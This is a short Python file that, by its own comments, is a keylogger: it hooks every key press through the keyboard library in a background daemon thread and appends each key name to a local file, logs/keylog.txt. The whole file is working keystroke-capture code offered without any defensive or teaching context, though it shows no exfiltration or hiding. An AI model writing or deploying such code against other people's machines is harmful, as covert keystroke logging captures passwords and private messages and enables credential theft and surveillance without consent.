import keyboard
import threading
import os

# Create logs folder if not exist
os.makedirs("logs", exist_ok=True)

# Function to log pressed keys
def log_key(event):
    with open("logs/keylog.txt", "a") as f:
        f.write(event.name + "\n")

# Start keylogger in a separate thread
def start_keylogger():
    threading.Thread(target=lambda: keyboard.on_press(log_key), daemon=True).start()
